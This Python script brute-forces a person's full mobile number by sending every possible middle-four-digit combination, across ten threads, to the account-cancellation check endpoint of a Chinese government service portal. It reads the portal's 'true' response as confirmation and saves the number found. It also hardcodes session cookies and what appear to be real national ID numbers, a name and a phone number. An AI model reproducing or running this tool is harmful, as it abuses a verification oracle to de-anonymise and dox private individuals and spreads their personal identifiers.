'''

in this version we've implemented multi-threads however
in this version,you have to change the cookies manually for everytime 


'''

from tkinter import messagebox
import requests
from selenium import webdriver
import time
import re
from concurrent.futures import ThreadPoolExecutor



class getNum:
    # get basic info
    def __init__(self):
        self.name = input('请输入姓名：')
        self.id = input('请输入身份证号码：')
        self.cookie = {
            'SERVERID':'24b389f31742363f338d174ed5b10c5f|1611984764|1611984745','acw_tc':'3ad79d1b16119847457286509e7c010ff4630d77b6c18860a7706efe31','JSESSIONID':'36182236901138375801E31C8F001753'


        }
        self.session = requests.session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/87.0.4280.141 Safari/537.36'}



    # fetch every part of the target number
    #     use selenium to fetch or use requests
    def cookie2str(self):
        driver = webdriver.Chrome()
        # step1. get the first cookie

        driver.get(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/inputUserMsg.do')
        driver.find_element_by_id('accountnum').send_keys('411424199605254259')
        randcode = input('please enter the randcode:')
        driver.find_element_by_xpath('//*[@id="randCode"]').send_keys(randcode)
        driver.find_element_by_xpath('//*[@id="inputusermsgform"]/div/div[3]/input').click()
        time.sleep(2)
        # cookie1_raw = driver.get_cookies()
        # # step1.2 transfer the raw cookie to the format that we need
        # cookie1 = [item["name"] + "=" + item["value"] for item in cookie1_raw]
        # cookiestr1 = ';'.join(item for item in cookie1)
        # string = cookiestr1
        # var = string.replace(';', "','")
        # var2 = var.replace('=', "':'")
        # final1 = "'" + var2 + "'"

        # step2. get the second cookie
        driver.find_element_by_xpath('//*[@id="username"]').send_keys('雷鹏')
        driver.find_element_by_xpath('//*[@id="papers"]').send_keys('36253119900902425X')
        driver.find_element_by_xpath('//*[@id="usermbile"]').send_keys('15295698722')
        driver.find_element_by_xpath('//*[@id="inputusermsgform"]/div/div[4]/input').click()

        # step2.2 fetch the cookie
        cookie_raw = driver.get_cookies()
        driver.close()
        # step2.3 transfer the raw cookie to the format that we need
        cookie = [item["name"] + "=" + item["value"] for item in cookie_raw]
        cookiestr = ';'.join(item for item in cookie)
        # string = cookiestr
        var = cookiestr.replace(';', "','")
        var2 = var.replace('=', "':'")
        final = "'" + var2 + "'"
        print(final)

        return final

    # start loop, multi-threads version
    def loop1(self, first_three, last_four):
        s = time.time()
        for i in range(0, 1000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop2(self, first_three, last_four):
        s = time.time()
        for i in range(1000, 2000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop3(self, first_three, last_four):
        s = time.time()
        for i in range(2000, 3000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop4(self, first_three, last_four):
        s = time.time()
        for i in range(3000, 4000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop5(self, first_three, last_four):
        s = time.time()
        for i in range(4000, 5000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop6(self, first_three, last_four):
        s = time.time()
        for i in range(5000, 6000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop7(self, first_three, last_four):
        s = time.time()
        for i in range(6000, 7000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop8(self, first_three, last_four):
        s = time.time()
        for i in range(7000, 8000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop9(self, first_three, last_four):
        s = time.time()
        for i in range(8000, 9000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                messagebox.showinfo(".", '.')
                break

    def loop10(self, first_three, last_four):
        s = time.time()
        for i in range(9000, 10000):
            # temp = middle_four
            if i < 10:
                middle_four = '000' + str(i)
            elif 10 <= i < 100:
                middle_four = '00' + str(i)
            elif 100 <= i < 1000:
                middle_four = '0' + str(i)
            else:
                middle_four = str(i)

            full_num = first_three + middle_four + last_four

            form_data = {
                'name': self.name,
                'papersNumber': self.id,
                'mobile': full_num
            }

            res = self.session.post(url='http://www.jszwfw.gov.cn/jsjis/front/accountCancel/checkInfo.do',
                                    cookies=self.cookie,
                                    data=form_data)
            print(full_num, 'has been tested...')

            if bool(re.search('true', res.text)):
                with open('/Users/jdd001/PycharmProjects/phone_num_check/phone_result/' + self.name + '的手机号码' + '.txt',
                          'w') as f:
                    f.write(full_num)
                print('该用户的电话号码是：', full_num)
                print('---------------------------all done!!! ---------------------------')
                e = time.time()
                print('总耗时：', e - s, 's')
                # raise Bad()
                messagebox.showinfo(".", '.')
                raise
                break


if __name__ == '__main__':
    # multi-threads version
    # init multi-thread

    # init all the parameters
    get_num = getNum()

    first_three = input('请输入手机号码的前三位：')
    last_four = input('请输入手机号码的后四位：')
    # s = time.time()
    # get_num.loop(first_three, last_four)
    # e = time.time()
    # print('总耗时：', e - s, 's')
    p = ThreadPoolExecutor(max_workers=10)
    p.submit(get_num.loop1, first_three, last_four)
    p.submit(get_num.loop2, first_three, last_four)
    p.submit(get_num.loop3, first_three, last_four)
    p.submit(get_num.loop4, first_three, last_four)
    p.submit(get_num.loop5, first_three, last_four)
    p.submit(get_num.loop6, first_three, last_four)
    p.submit(get_num.loop7, first_three, last_four)
    p.submit(get_num.loop8, first_three, last_four)
    p.submit(get_num.loop9, first_three, last_four)
    p.submit(get_num.loop10, first_three, last_four)
